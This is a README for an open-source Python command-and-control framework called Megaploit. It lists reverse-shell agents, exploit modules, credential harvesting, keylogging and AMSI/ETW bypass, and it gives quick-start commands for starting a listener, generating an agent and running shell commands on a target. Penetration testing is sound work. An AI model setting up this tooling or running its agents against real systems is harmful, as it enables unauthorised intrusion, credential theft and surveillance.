<div align="center">

# Megaploit

**Modern Python C2 Framework & Penetration Testing Toolbox**

*A Metasploit-class post-exploitation framework — Python-native, extensible, and built for modern infrastructure.*

[![CI](https://github.com/Josefifir/Megaploit/actions/workflows/ci.yml/badge.svg)](https://github.com/Josefifir/Megaploit/actions/workflows/ci.yml)
[![CodeQL](https://github.com/Josefifir/Megaploit/actions/workflows/ci.yml/badge.svg?label=CodeQL)](https://github.com/Josefifir/Megaploit/actions/workflows/ci.yml)
[![Docs](https://github.com/Josefifir/Megaploit/actions/workflows/docs.yml/badge.svg)](https://josefifir.github.io/Megaploit/)
[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue)](https://python.org)
[![License](https://img.shields.io/github/license/Josefifir/Megaploit)](LICENSE)
[![Tests](https://img.shields.io/badge/tests-553%20passing-brightgreen)](#running-tests)
[![Commands](https://img.shields.io/badge/session%20commands-135-blue)](https://github.com/Josefifir/Megaploit/wiki/Session-Commands)
[![GitHub Stars](https://img.shields.io/github/stars/Josefifir/Megaploit?style=social)](https://github.com/Josefifir/Megaploit/stargazers)

**[📖 Full Docs](https://josefifir.github.io/Megaploit/) · [📚 Wiki](https://github.com/Josefifir/Megaploit/wiki) · [🐛 Report Bug](https://github.com/Josefifir/Megaploit/issues/new?template=bug_report.md) · [💡 Request Feature](https://github.com/Josefifir/Megaploit/issues/new?template=feature_request.md)**

</div>

---

> ⚠️ **For authorised security research and penetration testing only.**
> You must have explicit written permission before using this tool against any system.
> Misuse is illegal and unethical. The authors accept no liability.

---

## What is Megaploit?

Megaploit is a **Command & Control (C2) framework** and **penetration testing toolbox** written entirely in Python 3.10+. Think of it as a Python-native Metasploit — with an interactive operator console, reverse-shell agents, exploit modules, scanners, a payload builder, and 135 post-exploitation commands.

**Key capabilities:**
- Receive reverse-shell connections from target machines (agents)
- Full control over targets through 135 specialised post-exploitation commands
- Exploit modules (EternalBlue, Log4Shell, BlueKeep, and more)
- Payload builder — 14 formats (Python, PowerShell, EXE, ELF, Go binary, and more)
- Pivot through compromised hosts into internal networks
- Credential harvesting, screenshots, keystrokes, file transfer
- AES-256-GCM encrypted transport, AMSI bypass, ETW patching

---

## Installation

### Requirements

| Requirement | Notes |
|---|---|
| Python 3.10+ | 3.11+ recommended |
| `git` on PATH | For toolbox clone operations |
| Linux / macOS / Windows | All three supported |

### Automated (Linux / macOS)

```bash
git clone https://github.com/Josefifir/Megaploit.git
cd Megaploit
sudo bash install.sh
```

### Manual

```bash
git clone https://github.com/Josefifir/Megaploit.git
cd Megaploit
pip install -r requirements.txt
```

**Optional packages** (unlock additional features):

```bash
pip install cryptography    # AES-256-GCM transport — strongly recommended
pip install flask           # Web dashboard
pip install impacket        # SMB enumeration + SMB exploit modules
pip install paramiko        # SSH brute-force module
pip install pyinstaller     # Build EXE/ELF payloads
pip install pyyaml          # Malleable C2 profiles
```

### Docker

```bash
docker build -t megaploit .
docker run -it --rm -p 4444:4444 -e LHOST=192.168.1.10 megaploit
```

Full Docker reference: [docs/DOCKER.md](docs/DOCKER.md)

---

## Quick Start

```bash
# 1. Start the server
python3 server.py -lh 192.168.1.10 -p 4444 --tls

# 2. Generate an agent (inside the console)
set lhost 192.168.1.10
set port 4444
generate --py

# 3. Run the agent on the target, then interact with the session
sessions
<session-id>
shell whoami
```

📖 Full step-by-step guide: **[docs/QUICKSTART.md](docs/QUICKSTART.md)**

---

## Documentation

All detailed technical documentation has moved to the **[Wiki](https://github.com/Josefifir/Megaploit/wiki)**:

| Topic | Link |
|---|---|
| Session Commands (135) | [Wiki → Session Commands](https://github.com/Josefifir/Megaploit/wiki/Session-Commands) |
| Global Commands | [Wiki → Global Commands](https://github.com/Josefifir/Megaploit/wiki/Global-Commands) |
| Payload Builder | [Wiki → Payload Builder](https://github.com/Josefifir/Megaploit/wiki/Payload-Builder) |
| Exploit Modules | [Wiki → Exploit Modules](https://github.com/Josefifir/Megaploit/wiki/Exploit-Modules) |
| Plugin System | [Wiki → Plugin System](https://github.com/Josefifir/Megaploit/wiki/Plugin-System) |
| TLS Encryption | [Wiki → TLS](https://github.com/Josefifir/Megaploit/wiki/TLS-Encryption) |
| Post-Exploitation Pipeline | [Wiki → Pipeline](https://github.com/Josefifir/Megaploit/wiki/Post-Exploitation-Pipeline) |
| Pivot Routes | [Wiki → Pivoting](https://github.com/Josefifir/Megaploit/wiki/Pivot-Routes) |
| AutoRunScript | [Wiki → AutoRunScript](https://github.com/Josefifir/Megaploit/wiki/AutoRunScript) |
| Web Dashboard & RPC | [Wiki → Web Dashboard](https://github.com/Josefifir/Megaploit/wiki/Web-Dashboard) |
| Credential Store & Reporting | [Wiki → Reporting](https://github.com/Josefifir/Megaploit/wiki/Reporting) |
| Architecture | [Wiki → Architecture](https://github.com/Josefifir/Megaploit/wiki/Architecture) |
| Professional Pentester Reference | [Wiki → Pentester Reference](https://github.com/Josefifir/Megaploit/wiki/Pentester-Reference) |

Supplementary local docs:
- [Quick Start Guide](docs/QUICKSTART.md)
- [Cheat Sheet](docs/CHEATSHEET.md)
- [Troubleshooting](docs/TROUBLESHOOTING.md)
- [Docker Reference](docs/DOCKER.md)
- [Full MkDocs Site](https://josefifir.github.io/Megaploit/)

---

## Running Tests

```bash
pip install pytest pytest-timeout
pytest tests/ -v
```

---

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines, branch policy, and how to open a pull request.

---

## License

This project is licensed under the terms in [LICENSE](LICENSE).
